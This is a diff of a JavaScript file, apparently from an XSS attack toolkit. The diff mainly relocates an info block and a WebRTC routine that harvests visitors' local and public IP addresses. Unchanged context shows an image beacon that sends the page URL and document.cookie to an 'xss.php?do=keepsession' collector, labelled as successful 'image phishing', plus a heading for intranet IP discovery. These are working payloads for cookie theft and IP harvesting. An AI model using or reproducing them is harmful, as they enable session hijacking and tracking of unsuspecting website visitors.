@@ -4,46 +4,6 @@ var MInfo ;
 var MForm = function () {
     //私用的方法或者属性保存在that上
     var that = this ;
-    //基础信息
-    var init = {
-        'name': 'form build' ,
-        'version':'1.0.1',
-        'author': 'sjm',
-        'params': 'MInfo',
-        'function': 'MForm'
-    } ;
-
-    //更多提示信息
-    init.more = function () {
-        console.log("更多插件相关：https://developer.chrome.com/extensions （你将有机会变成插件高手!）");
-    } ;
-
-    //月份
-    init.month = function (one) {
-        var month = {
-            "Jan":"一月 Jan January","Feb":"二月 Feb February","Mar":" 三月 Mar March",
-            "Apr ":" 四月 Apr April","May ":" 五月 May  May","Jun":" 六月 Jun June",
-            "Jul":" 七月 Jul July","Aug ":" 八月 Aug August","Sept":" 九月 Sept September",
-            "Oct":"十月 Oct October","Nov":" 十一月 Nov November","Dec " :" 十二月 Dec December"
-        };
-        if(one && month[one]) {
-            init.error(month[one],200);
-        }else {
-            console.log(month);
-        }
-    };
-
-    //基础提示
-    init.errorCode = function (httpCode) {
-        var code = {
-            "1xx": "1xx消息", "2xx": "2xx成功", "3xx": "3xx重定向", "4xx": "4xx客户端错误|请求错误", "5xx": "5xx服务器错误"
-        };
-        if (httpCode) {
-            that.errorCodeBase(httpCode.toString());
-        } else {
-            console.log(code);
-        }
-    };
 
     //内部code提示
     that.errorCodeBase = function (httpCode) {
@@ -130,6 +90,94 @@ var MForm = function () {
             console.log(backCode)
         }else {
             console.log(allCode);
+        }
+    };
+
+    //ip获取
+    that.getIps  = function (callback) {
+        var ip_dups = {};
+        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var useWebKit = !!window.webkitRTCPeerConnection;
+        if (!RTCPeerConnection) {
+            var win = iframe.contentWindow;
+            RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
+            useWebKit = !!win.webkitRTCPeerConnection;
+        }
+        var mediaConstraints = {
+            optional: [{
+                RtpDataChannels: true
+            }]
+        };
+        var servers = {
+            iceServers: [{
+                urls: "stun:stun.services.mozilla.com"
+            }]
+        };
+        var pc = new RTCPeerConnection(servers, mediaConstraints);
+        function handleCandidate(candidate) {
+            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+            var ip_addr = ip_regex.exec(candidate)[1];
+            if (ip_dups[ip_addr] === undefined) callback(ip_addr);
+            ip_dups[ip_addr] = true;
+        }
+        pc.onicecandidate = function(ice) {
+            if (ice.candidate) handleCandidate(ice.candidate.candidate);
+        };
+        pc.createDataChannel("");
+        pc.createOffer(function(result) {
+                pc.setLocalDescription(result,
+                    function() {},
+                    function() {});
+
+            },
+            function() {});
+        setTimeout(function() {
+                var lines = pc.localDescription.sdp.split('\n');
+                lines.forEach(function(line) {
+                    if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
+                });
+            },
+            1000);
+    };
+
+    //基础信息
+    var init = {
+        'name': 'form build' ,
+        'version':'1.0.1',
+        'author': 'sjm',
+        'params': 'MInfo',
+        'function': 'MForm'
+    } ;
+
+    //更多提示信息
+    init.more = function () {
+        console.log("更多插件相关：https://developer.chrome.com/extensions （你将有机会变成插件高手!）");
+    } ;
+
+    //月份
+    init.month = function (one) {
+        var month = {
+            "Jan":"一月 Jan January","Feb":"二月 Feb February","Mar":" 三月 Mar March",
+            "Apr ":" 四月 Apr April","May ":" 五月 May  May","Jun":" 六月 Jun June",
+            "Jul":" 七月 Jul July","Aug ":" 八月 Aug August","Sept":" 九月 Sept September",
+            "Oct":"十月 Oct October","Nov":" 十一月 Nov November","Dec " :" 十二月 Dec December"
+        };
+        if(one && month[one]) {
+            init.error(month[one],200);
+        }else {
+            console.log(month);
+        }
+    };
+
+    //基础提示
+    init.errorCode = function (httpCode) {
+        var code = {
+            "1xx": "1xx消息", "2xx": "2xx成功", "3xx": "3xx重定向", "4xx": "4xx客户端错误|请求错误", "5xx": "5xx服务器错误"
+        };
+        if (httpCode) {
+            that.errorCodeBase(httpCode.toString());
+        } else {
+            console.log(code);
         }
     };
 
@@ -252,53 +300,6 @@ var MForm = function () {
         var img = new Image();
         img.src= 'http://localhost:20002/xss.php?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie) ;
         init.error('图片钓鱼发送成功!',200);
-    };
-
-    //ip获取
-    that.getIps  = function (callback) {
-        var ip_dups = {};
-        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-        var useWebKit = !!window.webkitRTCPeerConnection;
-        if (!RTCPeerConnection) {
-            var win = iframe.contentWindow;
-            RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
-            useWebKit = !!win.webkitRTCPeerConnection;
-        }
-        var mediaConstraints = {
-            optional: [{
-                RtpDataChannels: true
-            }]
-        };
-        var servers = {
-            iceServers: [{
-                urls: "stun:stun.services.mozilla.com"
-            }]
-        };
-        var pc = new RTCPeerConnection(servers, mediaConstraints);
-        function handleCandidate(candidate) {
-            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
-            var ip_addr = ip_regex.exec(candidate)[1];
-            if (ip_dups[ip_addr] === undefined) callback(ip_addr);
-            ip_dups[ip_addr] = true;
-        }
-        pc.onicecandidate = function(ice) {
-            if (ice.candidate) handleCandidate(ice.candidate.candidate);
-        };
-        pc.createDataChannel("");
-        pc.createOffer(function(result) {
-                pc.setLocalDescription(result,
-                    function() {},
-                    function() {});
-
-            },
-            function() {});
-            setTimeout(function() {
-                var lines = pc.localDescription.sdp.split('\n');
-                lines.forEach(function(line) {
-                    if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
-                });
-            },
-            1000);
     };
 
     //获取内网ip
